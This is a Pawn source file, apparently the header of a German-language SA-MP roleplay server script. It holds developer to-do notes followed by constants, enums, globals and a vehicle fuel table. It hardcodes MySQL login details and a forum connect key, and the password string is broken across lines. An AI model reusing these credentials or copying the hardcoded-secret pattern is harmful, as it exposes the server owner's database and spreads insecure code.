/*
---------------------------------


GTA-City Reallife v7

MySQL R41-4






// Detektiv auto finden ab skill


// Server Verlassen rausgenommen


Registrierung SQL Injection ? By tec9


MySql BlueG R7

2011/2017


(AFK) Vor dem namen bei 10 Min AFK!


/heal geht obwohl er 100% Hat

Und es geht ins Minus!


Dynamische Admin Rang Namen!!




User Info System


Neben den Namen steht das Alter des User

BMX kann abschleppen Bug








Jedes Auto hat ne eigende Steuer

Steuerklassen erstellen


Nach Knast unjail ist man Freezed


wohnwagen bug !!

!!!!!!!!!!!!!!!!!!!!!!!!!!

mysql_format EINGEFÜGT! UNGETESTET - geht nicht


Holzfäller

Mienensystem Bergarbeiter

Dynamisches Objekt System mit Speicherung

/org System


----------------------- Optionale Update ---------------------------
/allbizinfo >> Zeigt alle Bizzes und deren Status (admincommand)

Jobs an der Stadthalle ausführlicher machen >> /ah Aktualisieren >> /help mit Datenbank

Busfahrer aka RPG ?

Org und Crew System - Dialog Stealer

Forum ala RPG Thereds USW



------------------------ Bugs --------------------------------------

Tankstellen nicht mehr Leertanken >> Gehen Momentan ins Minus wenn sie leer werden

Feuerwehr /duty Point und Skins fixxen >><< Skins müssen noch gefixxt werden

Ordnungsamt Frak Cars Freikaufen bug >><<

Transport Gmbh /petrols vollenden

Samp Haus Labels ala RPG

ATM SF Fixxen, Kein Objekt

Wohnwagen Bug beheben

Event System



To-Do-List:
-------------
-Holzfäller-System scripten

-Wohnwagen-System(Waffenschrank,Spawnsys, Heal)
Fahrzeuge dürfen keine anderen Fahrzeuge ziehen als Wohnwagen.

-Tore in der neuen Medic/Fire Base auch für Medics        nutzbar machen.

-Anhängerkupplung kaufbar machen(für Wohnwagen)

-Staatsfraktion änderung: nach taten bezahlen neben /setlohn; bsp. feuerwehrmann bekommt pro gelöschten brand 2k pro payday 3k gehen an die fkasse(nebenbei gibt es noch weitere löhne je nach rang per /setlohn).

-Org/Crew-System erweitern(Hilfeseite bei /help, Crewbasen farmerjobs nur für Crews ermöglich(Waffendealer,Drogendealer), Ränge von 1-6 für Crews.

-Bergarbeiter-System scripten (Mit dem Dozer Rohstoffe farmen, auf den Dumper laden, nach ca. 15Ladungen Rohstoffe abgeben. Dazu mehrere Job-Stufen mit unterschiedlichen Aufträgen und Löhnen)

-/back[Befehl]; teleportiert den Spieler zu seiner letzten Position, bevor er tp wurde.

-Tankstelle mit Tanksäulen hinzufügen (Fort Carson Tanke)

Transport GmbH:
-Transport GmbH neue Befehle hinzufügen.
( /ahabstellen ;zum abstellen der Anhänger der T GmbH
/ahparken ; zum parken einen Transportanhängers.)
-Neues Paketsystem mit einem Benzin abholspot und einem Produkt abholspot.
-Waffentransporter hinzufügen die vom Waffendealer(deliver spot) Materialien holen und sie zum Ammu fahren.

-FEUERWEHRZEICHEN auf der Karte nicht von überall sichtbar machen.

Bugfixes:
------------
-Tankstellen/Biz sollen nicht mehr ins Minus gehen können.   bsp. (Tank: -10234)


Vorschläge:
-Eigenen Hitsound ins Script einfügen?

-Standard Preis für erstellte Häuser auf 300k / Wohnungen 150k setzen?

-Wheelman Fraktion entfernen und Funktionen zu Hitman hinzufügen?

-/akillfire (Adminbefehl zum löschen aller Feuer auf dem Server.)

-/feuerlöscher wieder einfügen und beim 24/7 kaufbar machen.

-Fire Gun auf Rifle oder 9mm ändern.

-Würfelsystem(um Geld) mit
/dice [ID] [Gewinn welchen beide Spieler vorher bezahlen] macht man eine Anfrage zum Würfeln
mit /dice accept nimmt man den Würfelantrag an.
Danach wird zufällig eine Radnom Zahl von 1-6 in den Chat geschrieben(dabei gewinnt die kleinere Zahl)

-Schere,Stein,Papier
Man stellt eine Anfrage mit /stp [ID] [Gewinn]
Danach schreibt der andere /stp accept.
Es geht so lange bis einer Spieler 2 Runden mehr gewonnen hat als der andere.
Man kann Stein (/stp stein), Schere (/stp Schere) oder Papier (/stp papier) wählen. Dabei gelten die Regeln wie im echten SchereSteinPapier.

-Übersichts-System für Frakcars mit /fcars.
Dabei werden alle Frakcars angezeigt und wenn man auf ein Frakcar klickt, wird dessen Position auf der Map angezeigt.


-Von "veri" erstellbare Buslinien per Ingame.


/drivein Point setzen Ingame

Meine To Do liste XDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD

Strom Biz

Kartbahn (muss gefixxt werden)


/mygutscheine einfügen

usw

gehaltscheck Steuern bug

pStoreAusrauben

Double RP Einfügen "Aktivitätsbonus Message beim Joinen


Dynamische Fraktions Basen sBizz System

Dynamisches Busfahrer System

Bincos Ingame erstellen

Casinos erstellen

Death Pickups fixxen

Wohnwagen Bug fixxen


*/



#define PRESSED(%0) \
	(((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))





new pickup;
new pickupX;
new npcveh;
new reportsheute;


new torstatus[100];



new tor[100];
#define FLAME_ZONE 						1.2
#define ONFOOT_RADIUS					1.5
#define PISSING_WAY						2.0
#define CAR_RADIUS						15.0
#define Z_DIFFERENCE					2.5
#define EXTINGUISH_TIME_VEHICLE			2
#define EXTINGUISH_TIME_ONFOOT   		4
#define EXTINGUISH_TIME_PEEING			3
#define EXTINGUISH_TIME_PLAYER			3
#define SPECIAL_ACTION_PISSING 			68
#define MAX_FLAMES 						2000


#define MAX_ZONES 						10



#define DIALOG_STATUR_PRICE 7283

// Raketen
#define LAUNCH_CLIFT    -3
#define LAUNCH_NOM      -2
#define LAUNCH_NONE 	-1
#define LAUNCH_OPENGATE 0
#define LAUNCH_LIFTUP   1
#define LAUNCH_READY    2
#define LAUNCH_GO       3


//
#define DIALOG_INTERIOR 4325
#define DIALOG_FRAKID 7642
#define DIALOG_HINT_AENDERN 7643
#define DIALOG_FAUTOKAUF 7644

#define DIALOG_H11 7645
#define DIALOG_TUTORIAL_JANEIN 7646
#define DIALOG_FIRSTREPORT 7647
#define DIALOG_FBUDGET 7648
#define DIALOG_FBUDGET2 7649

// eventsys
#define DIALOG_EVSYSSTARTEN 7650
#define DIALOG_EVSYSKONFIG 7651
#define DIALOG_EVSYSSTARTENGRANAT 7652
#define DIALOG_EVSYSSTARTENZEIT 7653
#define DIALOG_EVSYSSTARTENMAXPLAYERS 7654
#define DIALOG_EVSYSSTARTENMINPLAYERS 7655
#define DIALOG_EVSYS 7656
#define DIALOG_EVSYSSTARTENWARTEZEIT 7657
#define DIALOG_EVSYSTEILNEHMEN 7658

//

#define DIALOG_HANDY 7659
#define DIALOG_HANDY_ORGVW 7670
#define DIALOG_HANDY_SMS 7671
#define DIALOG_HANDY_ANRUFEN 7672
#define DIALOG_HANDY_FMIETEN 7673
#define DIALOG_HANDY_FKAUFEN 7674

#define DIALOG_ORGVW_BERECHTIGUNGEN 7675
#define DIALOG_ORGVW 7676
#define DIALOG_RAKETE 7677
#define DIALOG_RAKETE_ZIELAUSWAHL 7678
#define DIALOG_RAKETE_SPIELERAUSWAHL 7679
#define DIALOG_ORGVW_SHOWFAHRZEUGE 7680

new Float:EventGranat[][] =
{
    {-970.1191,1094.1671,1345.0048,99.0242}, // Granat1
    {-975.0121,1068.9841,1344.9930,108.4243}, //
    {-971.2059,1025.0963,1345.0641,92.0682}, //
    {-1014.5237,1025.9054,1342.8251,13.1309}, //
    {-1049.5934,1023.2531,1343.0703,359.4068}, // Granat5
    {-1042.8645,1063.5774,1346.3667,70.0954},
    {-1021.7614,1095.7467,1342.3888,93.2196},
    {-1062.0826,1091.1874,1342.9355,198.1246}, // Granat 8
    {-1052.1331,1045.7871,1343.3599,252.0812},//
    {-1066.1470,1021.3539,1343.1488,12.0029},//
    {-1075.2434,1044.0472,1344.1519,68.7794},//
    {-1088.8702,1074.3965,1342.2656,329.1385}//Granat 12
};


new EventCountDownTimer;

new geschwindigkeit = 23;

//new EventFinalStart;
//
#define ForEachPlayer(%0) for(new index_%0=0,%0=ConnectedPlayerList[0];index_%0<ConnectedPlayers;index_%0++,%0=ConnectedPlayerList[index_%0])

forward OnFireUpdate();
forward FireTimer(playerid,id);
forward SetPlayerBurn(playerid);
forward BurningTimer(playerid);
forward StopPlayerBurning(playerid);

forward DestroyTheSmokeFromFlame(id);

#define DIALOG_BIZ_ERSTELLEN 4721


// Raketen

new Float: PublicX, Float:PublicY,Float:PublicZ;
new jetDoor, lift,
	missileBase[19],
	missileObject[4],
	launchStep = LAUNCH_NONE,
	launchTimer = (-1)
;
//
enum FlameInfo
{
	Flame_id,
	Flame_Exists,
	Float:Flame_x,
	Float:Flame_y,
	Float:Flame_z,
	Flame_world,
	Smoke[5]
}
new Flame[MAX_FLAMES][FlameInfo];

enum RaketenSyss
{
	RaketeGestartet,
	Float:ZielX,
	Float:ZielY,
	Float:ZielZ,
	Float:PlayerZielX,
	Float:PlayerZielY,
	Float:PlayerZielZ,
	RaketenZiel,
	ZielID,
	ZeitBisUsed,
	RakPlayerTimer
}

new RaketenSys[RaketenSyss];



enum ServerWirtschaftsInformationen
{
	Float:dwkurs, // Drogenwechselkurs      >> EIn nicht zufälliges system würde zu kompliziert sein und vermutlich ausgenutzt werden, allerdings kann man den spielern dies auch einfach nur verkaufen. Das ergebnis bleibt recht gleich
	Float:mwkurs  //Materialenwechselkurs
}
new Server[ServerWirtschaftsInformationen];


new htornew1,htornew2;

//#include <SyncHTTP>
#include <ocmd>

//#include "../include/mapandreas.inc"

#define DIALOG_AUSWAHL33 6701

#define DIALOG_ABGESCHLEPPTXD 1743

#define DIALOG_SONDERLACK 7341

#define DIALOG_GUTSCHEINMACHEN 5465

#define creategutschein 5723

#define WUNSCHCAR 3163

#define DIALOG_LACKIEREN 6732

#define DIALOG_GUTSCHEININFO 5672

#define DIALOG_FIXCAROFFER 5673

#define DIALOG_iORGLIZENZEN 5674 // +1 im sinn
//Global Textdraws:


new Text:Textdrawaisahuso[MAX_PLAYERS];
new musikan[MAX_PLAYERS];

new Text:Textdraw0;
new Text:Textdraw1;
new Text:Textdraw2;
new Text:Textdraw3;
new Text:Textdraw4;


new Text:Textdraw5;
new Text:Textdraw6;
new Text:Textdraw7;
new Text:Textdraw8;
new Text:Textdraw9;

//

new Text:TextDraw_EventZeit[3];


//
#define MAX_ORGANISATIONS               100 // was wenn erreicht?
#define MAX_ORGANISATIONS_FAHRZEUGE     200
#define ORG_MAX_POSSIBLE_CARS 15  // später vlt orgdefiniert abe immernoich mit maximum
enum OrganisationsInfo
{
    dborgid,
	OrgCreatet,
	OrgName[32],
	OrgOwner[24],
	OrgMotto[128],
	OrgMech,
	OrgDesk,
	LeaderCanKick,
	LeaderDeskAllow,
	OrgKasse,
	FahrzeugGemietet,
	FahrzeugeRows,
	leaderkasser,
	leaderkaufer,
	membermiet,
	leaderkicker,
	OrgValid

}
new OrgInfo[MAX_ORGANISATIONS][OrganisationsInfo];




enum OrgAutosInfo
{
	LocalID,
	orgautodbid,
	autoorgid,
	orgvehtype,
	Float:orgautox,
	Float:orgautoy,
	Float:orgautoz,
	Float:orgautor,
	orgautocolor,
	orgautocolor2,
	orgautokaufpreis
}
new OrgAuto[MAX_ORGANISATIONS_FAHRZEUGE][OrgAutosInfo];




enum StaatsInfo
{
	LSPDBudget,
	FBIBudget,
	ArmyBudget,
	Stadtreinigung,
	OAMTBudget,
	Rundfunk
}
new Staat[StaatsInfo];


// Bomb
//#define Max_Bomben 5
enum bomben
{
	bombid
};
new Bombe[bomben];


//



#define WBB_CONNECT_URL "gta-reallife.de/connect/index.php?key=test123"



new yakutor;




new VehicleColoursTableRGBANormal[120][120] =//120
{
	"{000000}", "{F5F5F5}", "{2A77A1}", "{840410}", "{263739}", "{86446E}", "{D78E10}", "{4C75B7}", "{BDBEC6}", "{5E7072}",
	"{46597A}", "{656A79}", "{5D7E8D}", "{58595A}", "{D6DAD6}", "{9CA1A3}", "{335F3F}", "{730E1A}", "{7B0A2A}", "{9F9D94}",
	"{3B4E78}", "{732E3E}", "{691E3B}", "{96918C}", "{515459}", "{3F3E45}", "{A5A9A7}", "{635C5A}", "{3D4A68}", "{979592}",
	"{421F21}", "{5F272B}", "{8494AB}", "{767B7C}", "{646464}", "{5A5752}", "{252527}", "{2D3A35}", "{93A396}", "{6D7A88}",
	"{221918}", "{6F675F}", "{7C1C2A}", "{5F0A15}", "{193826}", "{5D1B20}", "{9D9872}", "{7A7560}", "{989586}", "{ADB0B0}",
	"{848988}", "{304F45}", "{4D6268}", "{162248}", "{272F4B}", "{7D6256}", "{9EA4AB}", "{9C8D71}", "{6D1822}", "{4E6881}",
	"{9C9C98}", "{917347}", "{661C26}", "{949D9F}", "{A4A7A5}", "{8E8C46}", "{341A1E}", "{6A7A8C}", "{AAAD8E}", "{AB988F}",
	"{851F2E}", "{6F8297}", "{585853}", "{9AA790}", "{601A23}", "{20202C}", "{A4A096}", "{AA9D84}", "{78222B}", "{0E316D}",
	"{722A3F}", "{7B715E}", "{741D28}", "{1E2E32}", "{4D322F}", "{7C1B44}", "{2E5B20}", "{395A83}", "{6D2837}", "{A7A28F}",
	"{AFB1B1}", "{364155}", "{6D6C6E}", "{0F6A89}", "{204B6B}", "{2B3E57}", "{9B9F9D}", "{6C8495}", "{4D8495}", "{AE9B7F}",
	"{406C8F}", "{1F253B}", "{AB9276}", "{134573}", "{96816C}", "{64686A}", "{105082}", "{A19983}", "{385694}", "{525661}",
	"{7F6956}", "{8C929A}", "{596E87}", "{473532}", "{44624F}", "{730A27}", "{223457}", "{640D1B}", "{A3ADC6}", "{695853}"

};


//new CarName[][] =

new VehicleColoursTableRGBA[128][128] =
{
	"{177517}", "{210606}", "{125478}", "{452A0D}", "{571E1E}", "{010701}", "{25225A}", "{2C89AA}", "{8A4DBD}", "{35963A}",
	"{B7B7B7}", "{464C8D}", "{84888C}", "{817867}", "{817A26}", "{6A506F}", "{583E6F}", "{8CB972}", "{824F78}", "{6D276A}",
	"{1E1D13}", "{1E1306}", "{1F2518}", "{2C4531}", "{1E4C99}", "{2E5F43}", "{1E9948}", "{1E9999}", "{999976}", "{7C8499}",
	"{992E1E}", "{2C1E08}", "{142407}", "{993E4D}", "{1E4C99}", "{198181}", "{1A292A}", "{16616F}", "{1B6687}", "{6C3F99}",
	"{481A0E}", "{7A7399}", "{746D99}", "{53387E}", "{222407}", "{3E190C}", "{46210E}", "{991E1E}", "{8D4C8D}", "{805B80}",
	"{7B3E7E}", "{3C1737}", "{733517}", "{781818}", "{83341A}", "{8E2F1C}", "{7E3E53}", "{7C6D7C}", "{020C02}", "{072407}",
	"{163012}", "{16301B}", "{642B4F}", "{368452}", "{999590}", "{818D96}", "{99991E}", "{7F994C}", "{839292}", "{788222}",
	"{2B3C99}", "{3A3A0B}", "{8A794E}", "{0E1F49}", "{15371C}", "{15273A}", "{375775}", "{060820}", "{071326}", "{20394B}",
	"{2C5089}", "{15426C}", "{103250}", "{241663}", "{692015}", "{8C8D94}", "{516013}", "{090F02}", "{8C573A}", "{52888E}",
	"{995C52}", "{99581E}", "{993A63}", "{998F4E}", "{99311E}", "{0D1842}", "{521E1E}", "{42420D}", "{4C991E}", "{082A1D}",
	"{96821D}", "{197F19}", "{3B141F}", "{745217}", "{893F8D}", "{7E1A6C}", "{0B370B}", "{27450D}", "{071F24}", "{784573}",
	"{8A653A}", "{732617}", "{319490}", "{56941D}", "{59163D}", "{1B8A2F}", "{38160B}", "{041804}", "{355D8E}", "{2E3F5B}",
	"{561A28}", "{4E0E27}", "{706C67}", "{3B3E42}", "{2E2D33}", "{7B7E7D}", "{4A4442}", "{28344E}"
};




#define DIALOG_ADMINLOGIN 4266
#include <a_samp>
#include <a_npc>
#include <dini>
#include <utils>
#include <streamer>
#include <ocmd>
#include <a_mysql>

//#include <crashdetect>

//#include <crashdetect>
#include <JunkBuster>
//#include <geoip>

#define AUTOVERKAUFENAMK 7741


#define pWBB_CONNECT_KEY "Gegenhund.org11"
#define pWBB_URL "gta.de"


#include <sscanf>
#include <pWBB4>


#include <SyncHTTP>


#define Fmeldeamt 8841

#define DIALOG_REGSTEP_2 1448

// globale Variablen
new switcher[1500] = 0;
new toggle_switcher[1500] = 0; // Statt 1500 kann die maximale Fahrzeuganzahl eingetragen werden
new objekt1[1500], objekt2[1500], objekt3[1500], objekt4[1500];
new warn_timer[1500];



new ServerAntwort[240];
new ServerFrage[128];
new ServerGeld[100];
new active_quiz = 0;
new quiz_result = 0;
// die Dialogids:
	#define DIALOG_QUIZ_QUESTION 2145
	#define DIALOG_QUIZ_ANSWER 3256
	#define DIALOG_QUIZ_PRICE 1266


//#undef MAX_PLAYERS
//#define MAX_PLAYERS 1000

//mysql
//new mysqlcon;
new MySQL:mysqlcon;
#define MYSQL_HOST "db4free.net"
#define MYSQL_USER "gaming22"
#define MYSQL_PASS "hubertustrynice@gmail.com
"
#define MYSQL_DATABASE "svenfree"
//mysql

new hostname;

native gpci(playerid, serial[], len);


new bool:hatdenserverbetreten = false;

new RennenFArt[MAX_PLAYERS];
new DialogTempAmk[MAX_PLAYERS][50];
new DialogTempIndexAmk[MAX_PLAYERS];
new CheckPointSetted[MAX_PLAYERS];

new AntiAdminAbuse[MAX_PLAYERS];

// Spontanrennen
new Float:RennenX[MAX_PLAYERS],Float:RennenY[MAX_PLAYERS],Float:RennenZ[MAX_PLAYERS],CPRennenSetted[MAX_PLAYERS],
RennenHerausforderer[MAX_PLAYERS];

//

new TutStep[MAX_PLAYERS];
new StartBonusErhalten[MAX_PLAYERS];
new TutorialGemacht[MAX_PLAYERS];

new FirstReport[MAX_PLAYERS];


new Text3D:taxi3dtext[MAX_VEHICLES];
new DialogTemp[MAX_PLAYERS][50];
new DialogTempIndex[MAX_PLAYERS];
new DialogTempCarlist[MAX_PLAYERS][1000];// Maximale Anzahl an Fraktionsfahrzeugen
new DialogTempIndexCarlist[MAX_PLAYERS];
new DialogTempWanted[MAX_PLAYERS][50];
new DialogTempIndexWanted[MAX_PLAYERS];
new DialogTempCarlistx[MAX_PLAYERS][1000];// Maximale Anzahl an Fraktionsfahrzeugen
new DialogTempIndexCarlistx[MAX_PLAYERS];

new ConnectedPlayers;
new ConnectedPlayerList[MAX_PLAYERS+1];



new PlayerOnFire[MAX_PLAYERS];
new PlayerOnFireTimer[MAX_PLAYERS];
new PlayerOnFireTimer2[MAX_PLAYERS];
new ExtTimer[MAX_PLAYERS];
new Tick[MAX_PLAYERS];


new isInWohnwagen[MAX_PLAYERS];
//new HaveWohnwagen[MAX_PLAYERS];
new WohnwagenID[MAX_PLAYERS];



// Prison Scheisse


new temp44[MAX_PLAYERS];



new Float:PrisonCoords[MAX_PLAYERS][3];

new Float:PrisonCPs[30][3] = {
    {197.3844,2066.8677,22.6444},   //CP#1
    {199.7410,2035.7438,17.6406},   //CP#2
    {201.8200,1976.3516,17.6406},   //CP#3
    {226.2386,1956.9010,17.6406},   //CP#4
    {267.9132,1932.1830,17.6406},   //CP#5
    {291.8683,1900.2163,17.6406},   //CP#6
    {293.5479,1855.9917,17.6406},   //CP#7
    {294.3862,1811.6700,17.6481},   //CP#8
    {319.0899,1803.5377,17.6406},   //CP#9
    {337.8182,1833.5488,17.6406},   //CP#10
    {344.6217,1873.9855,17.7405},   //CP#11
    {378.0672,1897.6630,17.6406},   //CP#12
    {374.8871,1970.5988,17.6406},   //CP#13
    {373.0766,2026.5171,22.3476},   //CP#14
    {374.2168,2059.5518,17.6406},   //CP#15
    {316.6570,2059.0415,17.6406},   //CP#16
    {261.5944,2061.2676,17.6406},   //CP#17
    {250.8683,2026.9358,17.6406},   //CP#18
    {255.1440,1976.8456,17.6406},   //CP#19
    {271.9114,1960.8665,17.6406},   //CP#20
    {279.8184,1988.8387,17.6406},   //CP#21
    {279.8123,2021.4211,17.6406},   //CP#22
    {305.6822,2049.3508,17.6406},   //CP#23
    {345.9523,2032.0225,22.6406},   //CP#24
    {343.6999,1984.7050,17.6406},   //CP#25
    {320.8322,1958.5695,17.6406},   //CP#26
    {321.4838,1917.2905,17.6406},   //CP#27
    {312.8871,1873.8611,17.6406},   //CP#28
    {291.5989,1952.7435,17.6406},   //CP#29
    {301.6530,1999.8466,17.6406}    //CP#30
};

forward EnableCheckpointingAgain(playerid);
forward Float:GetDistanceToInsideCheckpoint(playerid,checkpointid);
forward Float:GetDistanceToOutsideCheckpoint(playerid,checkpointid);
forward Float:GetDistanceToClosestInside(playerid);
forward Float:GetDistanceToClosestOutside(playerid);



//new IRGENDWAS[MAX_PLAYERS][pInfo];



// Prison Scheisse Ende



#define DIALOG_NUMBERPLATE 5421
#define DIALOG_WANTED 1332
#define DIALOG_AUFTRAGE 1532
#define SLOT 1
#define DIALOG_NEULINGSFRAK 4738
#define DIALOG_BANNED 7782
/*
// Anti Vehicle Teleporter
#define PRIVATE:%0(%1)  static stock %0(%1)
#define MAX_SYNC_TYPES          (5)
#define SYNC_TYPE_POS           (0)

#define JB:: \
	JB_


enum JB::sInfo
{
	JB::sSyncTime,
	JB::sLastSyncUpdate
};
static JB::SyncInfo [MAX_PLAYERS][MAX_SYNC_TYPES][JB::sInfo];
// Anti Vehicle Teleporter
*/
new VehVerkauf[MAX_PLAYERS];
new DialogShowed[MAX_PLAYERS];

new Desktop_Check[MAX_PLAYERS];

new KeyStatus[MAX_PLAYERS];


//new GutscheinKey[128][MAX_PLAYERS];//Format(string1, sizeof(string1), "TEXT");
new GutscheinResult[MAX_PLAYERS];
new GutscheinResultPlayer[MAX_PLAYERS];

new Desktop_Status[MAX_PLAYERS];
new Desktop_Timer[MAX_PLAYERS];
new Desktop_Timer_Started[MAX_PLAYERS];

new Text:TDEditor_TD[MAX_PLAYERS];

new gateamk;

//new musikvar;

#define DIALOG_CALL 5627
#define MAX_newsObjekt 20

#pragma dynamic 8192
#pragma tabsize 0
static gTeam[MAX_PLAYERS];
#define MAX_WEED 5000
#define ishop 	  300

#define DIALOG_PICKUP 8731
#define DIALOG_TAXIFAHRER 7819
#define MAX_ZONE_NAME 30

new otor1,otor2;
new fbi3333;
new fbi2222;

// Pickupsystem
new spawnpickup,deaglepickup,healpickup,armourpickup;
new deaglepickupvar,healpickupvar,spawnpickupvar,armourpickupvar;
//
new Text3D:DeathText[MAX_PLAYERS];

new tachotimer[MAX_PLAYERS];

//new timer4[MAX_PLAYERS];
new gPlayerAbwerbeTrys[MAX_PLAYERS];
//new gPlayerLogTries[MAX_PLAYERS];
new Text:Speedo[MAX_PLAYERS];
new Text:tacho[MAX_VEHICLES];
new Text:Textdraw10[MAX_PLAYERS];

new Text:WantedTextdraw[MAX_PLAYERS];


//new tec9object[MAX_PLAYERS];// Falsche Poss ^^




new terrorgate631;


new terrotgate772;


new terrorgate532;






enum weaponsx
{
	Melee,
	Thrown,
	Pistols,
	Shotguns,
	SubMachine,
	Assault,
	Rifles,
	Heavy,
	Handheld,

}
new Weaponsx[MAX_PLAYERS][weaponsx];


/*
new Text:Kilometer_TD[MAX_PLAYERS];
new Text:Benzin_TD[MAX_PLAYERS];
new Text:KMH_TD[MAX_PLAYERS];
new Text:Fahrzeug_TD[MAX_PLAYERS];
new Text:Umgebung_TD[MAX_PLAYERS];
*/
//new PlayerMoney[MAX_PLAYERS];

// Gangfight
new Vagos;
new Ballas;
new Grove;
//new Aztecas;
new Gangfights;
new Yakuza;
new Russianm;
new Triaden;
new LCN;


new Text3D:gangwarlabel;
//new Text3D:Noob[MAX_PLAYERS];
new Text3D:lspdkammer;
new Text3D:fbikammer;
new Text3D:lvpdkammer;

new hacken[MAX_PLAYERS];


//


new TFCheckpoint[MAX_PLAYERS];
new TACheckpoint[MAX_PLAYERS];
new TBCheckpoint[MAX_PLAYERS];
//new LSSFCheckpoint[MAX_PLAYERS];
//new LSLVCheckpoint[MAX_PLAYERS];
new LVSFCheckpoint[MAX_PLAYERS];
new LVLSCheckpoint[MAX_PLAYERS];
new SFLSCheckpoint[MAX_PLAYERS];
new SFLVCheckpoint[MAX_PLAYERS];
new ZUGCheckpoint[MAX_PLAYERS];

new FlugCheckpoint[MAX_PLAYERS];
new L1Checkpoint[MAX_PLAYERS];
new L2Checkpoint[MAX_PLAYERS];
//new L3Checkpoint[MAX_PLAYERS];
new lspdtor;
new fbitor;
new fixpoints;
new fixpoints2;
new fixpoints3;
new fixpoints4;
new EventInt, EventVW;
new MakeAnimation[MAX_PLAYERS];
new TotenKopf[MAX_PLAYERS];
new DeathIconErstellt[MAX_PLAYERS];

new Float:specx[MAX_PLAYERS];
new Float:specy[MAX_PLAYERS];
new Float:specz[MAX_PLAYERS];
new Float:specrot[MAX_PLAYERS];
new specint[MAX_PLAYERS];
new specvworld[MAX_PLAYERS];


forward PrintBizInfo(playerid,targetid);
forward PrintSBizInfo(playerid,targetid);
forward ShowMarke(playerid,targetid);

new haustor2;

new Text3D:LSWText;
#define DIALOG_REPORT 4718
//--------------------------------
new oamtschranke;
new newschranke;
//new bool:disablelogin = true;
new bool:disablereg = true;
//-------------------
#define Rot 0xFF000000
#define Weiss 0xFFFFFFFF
//-------------------
#define SCMTA SendClientMessageToAll
#define SCM SendClientMessage
#define TEAM_BALLAS_COLOR 0xD900D3C8
#define TEAM_AZTECAS_COLOR 0x01FCFFC8
//-------------------
#define SERVERNAME "SA-MP GTA-City Reallife 0.3.7 R2"//
forward SaveMysqlPlayer(playerid);
//-------------------
//new MySQL:mysql;
//Variables:
new AntiFakekill[MAX_PLAYERS];
new stringtu[128];

//Forwards:
forward AntiFakekillTimer(playerid);
// Ende

forward kicktimer(giveplayerid);
forward bantimer(giveplayerid);
forward kicktimerfake(playerid);
//

forward OnPropUpdate();
forward LoadProperty();

forward SaveProperty(h);
forward LoadBizz();
forward LoadSBizz();
forward Checkprop();
forward DateProp(playerid);


#define DIALOG_RANGNAME 9343
#define DIALOG_RANG1 9453
#define DIALOG_RANG2 9532
#define DIALOG_RANG3 9634
#define DIALOG_RANG4 9753
#define DIALOG_RANG5 4813
#define DIALOG_RANG6 9945
#define DIALOG_RANG7 9032
#define DIALOG_RANG8 9015
#define DIALOG_RANG9 9813
#define DIALOG_RANG10 9483
#define DIALOG_RANG11 9721
#define DIALOG_RANG12 9251


enum RangInfo
{
Rang1[256],
Rang2[256],
Rang3[256],
Rang4[256],
Rang5[256],
Rang6[256],
Rang7[256],
Rang8[256],
Rang9[256],
Rang10[256],
Rang11[256],
Rang12[256]
}
new Rangname[32][RangInfo];

// DTC Cars
enum Rohr
{
	Neon,
	Neon1,
}
#define RefuelWait 5000
new SireneFrak[2080];
new Wohnwagen[2080];
new Neonrohr[2080][Rohr];
new Refueling[MAX_PLAYERS];
#define DIALOG_NEON 5416
#define respawntime 500//60 Respawntime der Showfahrzeuge
#define MaxVeh 101 // Anzahl Möglicher Fahrzeuge pro Person!
#define AUTOHAUSER 9 // Anzahl der Autohäuser
#define MAXPARKPLATZE 12 // Anzahl der Ausgabepunkte
#define CAR_AMOUNT 700 //Change to Your Vehicle Amount
new Gas[MAX_VEHICLES];

forward IsAShowCarEdel(carid);
forward IsAHandelCar(carid);
new ShowCarEdel[19];//
new HandelCar[67];


new GasMax[] = {
60, //"Landstalker",
50,//"Bravura",
50,//"Buffalo",
110,//"Linerunner",
45,//"Pereniel",
50,//"Sentinel",
200,//"Dumper",
80,//"Firetruck",
75,//"Trashmaster",
60,//"Stretch",
40,//"Manana",
50,//"Infernus",
50,//"Voodoo",
90,//"Pony",
90,//"Mule",
48,//"Cheetah",
70,//"Ambulance",
60,//"Leviathan",
60,//"Moonbeam",
50,//"Esperanto",
45,//"Taxi",
40,//"Washington",
60,//"Bobcat",
64,//"Mr Whoopee",
60,//"BF Injection",
250,//"Hunter",
50,//"Premier",
80,//"Enforcer",
70,//"Securicar",
52,//"Banshee",
50,//"Predator",
80,//"Bus",
100,//"Rhino",
50,//"Barracks",
55,//"Hotknife",
100,//"Trailer",
58,//"Previon",
95,//"Coach",
48,//"Cabbie",
45,//"Stallion",
70,//"Rumpo",
100,//"RC Bandit",
50,//"Romero",
130,//"Packer",
120,//"Monster Truck",
45,//"Admiral",
50,//"Squalo",
80,//"Seasparrow",
30,//"Pizzaboy",
100,//"Tram",
100,//"Trailer",
55,//"Turismo",
55,//"Speeder",
60,//"Reefer",
60,//"Tropic",
160,//"Flatbed",
80,//"Yankee",
20,//"Caddy",
48,//"Solair",
75,//"Berkley's RC Van",
100,//"Skimmer",
50,//"PCJ-600",
30,//"Roller",
45,//"Freeway",
100,//"RC Baron",
100,//"RC Raider",
60,//"Glendale",
55,//"Oceanic",
45,//"Sanchez",
80,//"Sparrow",
95,//"Patriot",
25,//"Quad",
50,//"Coastguard",
50,//"Dinghy",
50,//"Hermes",
55,//"Sabre",
90,//"Rustler",
60,//"ZR-350",
60,//"Walton",
58,//"Regina",
55,//"Comet",
100,//"Fahrrad",
100,//"Burrito",
100,//"Camper",
60,//"Marquis",
35,//"Baggage",
150,//"Dozer",
100,//"Maverick",
100,//"News Chopper",
80,//"Rancher",
80,//"FBI Rancher",
50,//"Virgo",
50,//"Greenwood",
100,//"Jetmax",
70,//"Hotring",
80,//"Sandking",
50,//"Blista Compact",
80,//"Police Maverick",
80,//"Boxville",
58,//"Benson",
80,//"Mesa",
100,//"RC Goblin",
75,//"Hotring Racer",
75,//"Hotring Racer",
75,//"Bloodring Banger",
75,//"Rancher",
60,//"Super GT",
45,//"Elegant",
110,//"Journey",
100,//"Bike",
100,//"Mountain Bike",
50,//"Beagle",
50,//"Cropdust",
50,//"Stunt",
140,//"Tanker",
100,//"RoadTrain",
50,//"Nebula",
50,//"Majestic",
48,//"Buccaneer",
150,//"Shamal",
175,//"Hydra",
45,//"FCR-900",
45,//"NRG-500",
48,//"HPV1000",
135,//"Cement Truck",
75,//"Tow Truck",
60,//"Fortune",
60,//"Cadrona",
65,//"FBI Truck",
55,//"Willard",
30,//"Forklift",
35,//"Traktor",
60,//"Combine",
